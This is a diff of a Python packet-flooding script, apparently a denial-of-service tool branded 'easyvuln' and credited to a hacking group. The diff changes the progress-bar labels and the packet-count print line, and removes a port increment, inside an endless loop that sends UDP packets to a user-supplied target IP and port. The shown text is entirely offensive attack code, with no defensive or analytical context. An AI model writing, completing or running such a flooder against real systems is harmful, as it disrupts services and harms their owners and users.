@@ -27,23 +27,27 @@ redhackaze.org | MyPoison ig:@yusuf.ngs                  """)
         ip = input("IP Target \neasyvuln > ")
         port = int(input("Port \neasyvuln > "))
         os.system("cls")
-        print ("[                    ] 0% ")
+        print ("Easy Vuln Mod > [                    ] 0% ")
         time.sleep(5)
-        print ("[>>>>               ] 25%")
+        print ("Easy Vuln Mod > [>>>>               ] 25%")
         time.sleep(5)
-        print ("[>>>>>>>>>          ] 50%")
+        print ("EASY Vuln Mod > [>>>>>>>>>          ] 50%")
         time.sleep(5)
-        print ("[>>>>>>>>>>>>>>>>>  ] 75%")
+        print ("Easy Vuln Mod > [>>>>>>>>>>>>>>>>>  ] 75%")
         time.sleep(5)
-        print ("[>>>>>>>>>>>>>>>>>>>] 100%")
+        print ("Easy Vuln Mod > [>>>>>>>>>>>>>>>>>>>] 100%")
         time.sleep(3)
         sent = 0
         while True:
+
              sock.sendto(bytes, (ip,port))
              sent = sent + 1
-             port = port + 1
-             print ("%s packets are sending to the %s . Port number:%s"%(sent,ip,port))
+             sentstr = sent
+             sentstr = str(sentstr)
+
+             print (sentstr+" packets are sending to the "+ip+" Port Number: "+str(port))
              if (port == 65534):
                port = 1
     else:
         count +=1
+
